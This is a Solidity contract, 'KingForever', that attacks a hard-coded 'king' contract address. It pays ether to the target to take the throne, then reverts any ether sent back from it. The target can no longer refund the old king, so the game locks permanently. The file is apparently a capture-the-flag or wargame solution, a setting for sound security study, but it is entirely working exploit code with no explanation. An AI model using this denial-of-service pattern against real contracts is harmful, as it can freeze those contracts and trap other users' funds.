// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

/**
 * @title KingForever
 * @dev Pay contract to become king and prevents receiving ether from King contract for triggering revert
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract KingForever {
    address payable king_contract = payable(address(0x75DE3D8985bE4F82Ad70c0adD4c0310Cc0934f96));

    function becomeKing() public payable {
        (bool success,) = king_contract.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }

    receive() external payable {
        require(msg.sender != king_contract);
    }
}